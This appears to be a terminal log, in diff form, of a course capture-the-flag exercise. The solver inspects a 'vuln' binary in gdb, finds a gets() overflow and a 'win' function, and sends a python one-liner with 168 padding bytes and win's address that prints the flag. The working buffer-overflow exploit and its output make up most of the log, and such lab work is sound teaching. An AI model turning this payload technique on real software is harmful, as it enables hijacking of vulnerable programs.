@@ -1,0 +1,131 @@
+❯ nc 10.0.118.104 4455
+Welcome to the CTF Challenge!
+You have access to the following tools:
+  - gdb: Inspect and debug the 'vuln' binary.
+  - vuln: Run the vulnerable binary.
+  - nc: Test exploitation with netcat.
+Explore the binary to find and exploit the vulnerability!
+----------------------------------------------------------
+ls
+bash
+flag.txt
+gdb
+lib
+lib64
+ls
+vuln
+welcome.sh
+./vuln
+Enter a string:
+asdfghjhgfdsasdfghgfdsdfghgfdsa
+asdfghjhgfdsasdfghgfdsdfghgfdsa
+gdb ./vuln
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+(gdb) disassemble vuln
+Dump of assembler code for function vuln:
+   0x0000000000400773 <+0>:	push   %rbp
+   0x0000000000400774 <+1>:	mov    %rsp,%rbp
+   0x0000000000400777 <+4>:	sub    $0xa0,%rsp
+   0x000000000040077e <+11>:	lea    -0xa0(%rbp),%rax
+   0x0000000000400785 <+18>:	mov    %rax,%rdi
+   0x0000000000400788 <+21>:	callq  0x4005f0 <gets@plt>
+   0x000000000040078d <+26>:	lea    -0xa0(%rbp),%rax
+   0x0000000000400794 <+33>:	mov    %rax,%rdi
+   0x0000000000400797 <+36>:	callq  0x4005a0 <puts@plt>
+   0x000000000040079c <+41>:	mov    0x2008cd(%rip),%rax        # 0x601070 <stdout@@GLIBC_2.2.5>
+   0x00000000004007a3 <+48>:	mov    %rax,%rdi
+   0x00000000004007a6 <+51>:	callq  0x400600 <fflush@plt>
+   0x00000000004007ab <+56>:	leaveq
+   0x00000000004007ac <+57>:	retq
+End of assembler dump.
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400570  _init
+0x00000000004005a0  puts@plt
+0x00000000004005b0  setresgid@plt
+0x00000000004005c0  __libc_start_main@plt
+0x00000000004005d0  fgets@plt
+0x00000000004005e0  __gmon_start__@plt
+0x00000000004005f0  gets@plt
+0x0000000000400600  fflush@plt
+0x0000000000400610  getegid@plt
+0x0000000000400620  fopen@plt
+0x0000000000400630  _start
+0x0000000000400660  deregister_tm_clones
+0x0000000000400690  register_tm_clones
+0x00000000004006d0  __do_global_dtors_aux
+0x00000000004006f0  frame_dummy
+0x000000000040071d  win
+0x0000000000400773  vuln
+0x00000000004007ad  main
+0x0000000000400810  __libc_csu_init
+0x0000000000400880  __libc_csu_fini
+0x0000000000400884  _fini
+(gdb) run
+Starting program: /buffer_ctf/vuln
+warning: Error disabling address space randomization: Operation not permitted
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004007ac in vuln ()
+(gdb) info registers
+rax            0x0	0
+rbx            0x0	0
+rcx            0x7f430b9fd3c0	139925934560192
+rdx            0x0	0
+rsi            0x7f430bcd29e0	139925937531360
+rdi            0x1	1
+rbp            0x4141414141414141	0x4141414141414141
+rsp            0x7ffda525bd08	0x7ffda525bd08
+r8             0x7f430beea740	139925939726144
+r9             0x4141414141414141	4702111234474983745
+r10            0x4141414141414141	4702111234474983745
+r11            0x246	582
+r12            0x400630	4195888
+r13            0x7ffda525be10	140727374167568
+r14            0x0	0
+r15            0x0	0
+rip            0x4007ac	0x4007ac <vuln+57>
+eflags         0x10246	[ PF ZF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb)
+
+==============================================================================================================================
+
+❯ nc 10.0.118.104 4455
+Welcome to the CTF Challenge!
+You have access to the following tools:
+  - gdb: Inspect and debug the 'vuln' binary.
+  - vuln: Run the vulnerable binary.
+  - nc: Test exploitation with netcat.
+Explore the binary to find and exploit the vulnerability!
+----------------------------------------------------------
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*168 + b"\x1d\x07\x40\x00\x00\x00\x00\x00")' | ./vuln
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
+hello:)CS431{ctfX}
+/bin/bash: line 1:    97 Done                    python3 -c 'import sys; sys.stdout.buffer.write(b"A"*168 + b"\x1d\x07\x40\x00\x00\x00\x00\x00")'
+        98 Segmentation fault      (core dumped) | ./vuln
